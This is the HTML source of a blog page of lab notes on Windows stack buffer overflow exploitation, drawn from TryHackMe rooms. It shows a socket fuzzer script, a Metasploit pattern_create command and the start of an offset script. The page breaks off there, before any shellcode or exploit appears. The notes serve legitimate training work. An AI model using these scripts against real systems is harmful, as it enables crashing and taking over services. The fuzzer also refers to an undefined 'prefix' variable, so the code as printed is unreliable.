<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-hacker/bufferoverflow/windows" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Windows x86-64 Buffer Overflow Exploitation Guide | The Uncommon Engineer</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" property="og:image" content="https://www.uncommonengineer.com/img/social-card.png"><meta data-rh="true" name="twitter:image" content="https://www.uncommonengineer.com/img/social-card.png"><meta data-rh="true" property="og:url" content="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/windows"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows x86-64 Buffer Overflow Exploitation Guide | The Uncommon Engineer"><meta data-rh="true" name="description" content="Complete guide to Windows buffer overflow exploitation using Immunity Debugger and Mona. Learn stack-based buffer overflow techniques for penetration testing."><meta data-rh="true" property="og:description" content="Complete guide to Windows buffer overflow exploitation using Immunity Debugger and Mona. Learn stack-based buffer overflow techniques for penetration testing."><meta data-rh="true" name="keywords" content="buffer overflow,windows exploitation,immunity debugger,mona,penetration testing,exploit development,x86-64,stack overflow"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/windows"><link data-rh="true" rel="alternate" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/windows" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/windows" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://9UFF3RBJQ9-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"üè¥‚Äç‚ò†Ô∏è Hacker","item":"https://www.uncommonengineer.com/docs/category/Ô∏è-hacker"},{"@type":"ListItem","position":2,"name":"Windows x86-64 Buffer Overflow Exploitation Guide","item":"https://www.uncommonengineer.com/docs/hacker/bufferoverflow/windows"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="The Uncommon Engineer RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="The Uncommon Engineer Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="The Uncommon Engineer" href="/opensearch.xml">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-DMRNTVGLRC"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DMRNTVGLRC",{anonymize_ip:!0})</script>

<script src="/js/console-clue.js"></script>
<script src="/js/metricool.js"></script>
<script src="https://subscribe-forms.beehiiv.com/embed.js" async></script><link rel="stylesheet" href="/assets/css/styles.5170efae.css">
<script src="/assets/js/runtime~main.3d5cd519.js" defer="defer"></script>
<script src="/assets/js/main.727d0b4f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/profile.svg" alt="The Uncommon Engineer" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/profile.svg" alt="The Uncommon Engineer" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Uncommon Engineer</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/">Technical</a><a class="navbar__item navbar__link" href="/blog/">Analysis &amp; Essays</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about/">About</a><a class="navbar__item navbar__link" href="/projects/">Projects</a><a class="navbar__item navbar__link" href="/changelog/">Changelog</a><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">‚ñ∂ Start Here</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/books/reading-list">üìö Books &amp; Papers</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/study/SCS-C01/">üìó Study</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/Ô∏è-hacker">üè¥‚Äç‚ò†Ô∏è Hacker</a><button aria-label="Collapse sidebar category &#x27;üè¥‚Äç‚ò†Ô∏è Hacker&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/search">16 Essential Search Engines for Penetration Testing and Reconnaissance</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/tryhackme/adbasics">TryHackMe</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/hackthebox/traverxec">HackTheBox</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/rtfm">Red Team Field Manual (RTFM) - Essential Commands and Techniques</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/HowToDecodeStuff">Cryptography and Decoding Techniques for CTF and Penetration Testing</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/hacker/bufferoverflow/windows">Buffer Overflow</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/hacker/bufferoverflow/windows">Windows x86-64 Buffer Overflow Exploitation Guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/bufferoverflow/x86">Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/bufferoverflow/resources">Buffer Overflow Resources, Tips, and Techniques - Exploitation Learning Materials</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/acme">ACME Evil Corp Investigation - Digital Forensics and Threat Analysis</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/techforgood">Tech for Good Cryptography Challenge - Secret Message Decryption CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/RNZ-online-complaint">Complaint: RNZ &#x27;New Gaza&#x27; Article</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/-engineer">üíª Engineer</a><button aria-label="Expand sidebar category &#x27;üíª Engineer&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/archive/docker-wordpress/docker-wordpress-1">üóÉ Archive</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/Ô∏è-hacker"><span>üè¥‚Äç‚ò†Ô∏è Hacker</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Buffer Overflow</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Windows x86-64 Buffer Overflow Exploitation Guide</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows x86-64 Buffer Overflow Exploitation Guide</h1></header><div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Notes from TryHackMe&#x27;s <code>Brainstorm</code> and <code>BufferOverflowPrep</code> Rooms.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-setup">The Setup<a href="#the-setup" class="hash-link" aria-label="Direct link to The Setup" title="Direct link to The Setup">‚Äã</a></h2>
<p>When you have a blind target to buffer overflow, you need to set up a local system to model the target and use it to design and develop your overflow.</p>
<p>The windows setup I used is:</p>
<ul>
<li>A Windows 7 VM</li>
<li>Immunity Debugger installation</li>
<li>Mona modules python scripts for the debugger</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-process">The Process<a href="#the-process" class="hash-link" aria-label="Direct link to The Process" title="Direct link to The Process">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p>Big thank you to <a href="https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw" target="_blank" rel="noopener noreferrer">The Cyber Mentor</a> who&#x27;s <a href="https://www.youtube.com/watch?v=qSnPayW6F7U&amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G" target="_blank" rel="noopener noreferrer">&quot;Buffer Overflows Made Easy&quot;</a> YouTube playlist was the most well explained video series I found at the time.</p></div></div>
<p>This has been written up far better in a lot of places, but for my own notes and understanding I will write it out in the best way that makes sense to me.</p>
<p>The steps are:</p>
<ol>
<li>Fuzz the Program</li>
<li>Find the Offset</li>
<li>Control the EIP</li>
<li>Bad Character Check</li>
<li>find a module</li>
<li>create shellcode</li>
<li>exploit</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fuzz-the-program">Fuzz the Program<a href="#fuzz-the-program" class="hash-link" aria-label="Direct link to Fuzz the Program" title="Direct link to Fuzz the Program">‚Äã</a></h2>
<p>The scenario would be once you&#x27;ve found a function in the program that you may be able to overflow, you start sending it incrementally-increasing payloads and watch how many bytes it takes to crash.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="fuzzerpy">fuzzer.py<a href="#fuzzerpy" class="hash-link" aria-label="Direct link to fuzzer.py" title="Direct link to fuzzer.py">‚Äã</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockTitle_OeMC">fuzzer.py</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ip </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;172.16.2.125&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># the target server IP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">port </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">9999</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># port the vulnerable program is listening on</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">timeout </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">payload </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># the start size for the payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">while</span><span class="token plain"> </span><span class="token boolean" style="color:rgb(255, 88, 116)">True</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">try</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">with</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">as</span><span class="token plain"> s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">settimeout</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">timeout</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ip</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1024</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Fuzzing with {} bytes&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token builtin" style="color:rgb(130, 170, 255)">format</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">-</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">prefix</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">bytes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;latin-1&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1024</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">except</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Fuzzing crashed at {} bytes&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token builtin" style="color:rgb(130, 170, 255)">format</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">-</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">prefix</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    sys</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  payload </span><span class="token operator" style="color:rgb(127, 219, 202)">+=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># increment the payload by 100 x A&#x27;s</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  time</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<p>Eventually the program will stop responding and timeout and our script will write <code>&quot;Fuzzing crashed at x bytes&quot;</code> and we will have roughly our payload size that crashes the program.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="find-the-offset">Find the Offset<a href="#find-the-offset" class="hash-link" aria-label="Direct link to Find the Offset" title="Direct link to Find the Offset">‚Äã</a></h2>
<p>We know the payload size from the fuzzer, now we create a random string of <code>x</code> length as our new payload.</p>
<p><em>Why?</em> Because we want to find the number of bytes it takes from the bottom of our buffer, to the beginning of the EIP address- this &quot;distance&quot; is the offset. If we know the offset, we know how many bytes to use up in the payload before the return address so that it gets written perfectly over the EIP.</p>
<p>We use 2 x tools from metasploit to find the offset:</p>
<ol>
<li><code>pattern_create.rb</code> - to create a string pattern the length found by the fuzzer.</li>
<li><code>pattern_offset.rb</code> - find the offset within that pattern given the specific segment of that pattern that was overwritten onto the EIP.</li>
</ol>
<p>For example...</p>
<p>let&#x27;s say <code>Fuzzing crashed at 6300 bytes.</code></p>
<p>pattern create: <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="offsetpy">offset.py<a href="#offsetpy" class="hash-link" aria-label="Direct link to offset.py" title="Direct link to offset.py">‚Äã</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ip </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;172.16.2.125&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># IP of the target server.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">port </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">offset </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> offset</span><br></span><span class="token-line" style="color:#d6deeb"><span 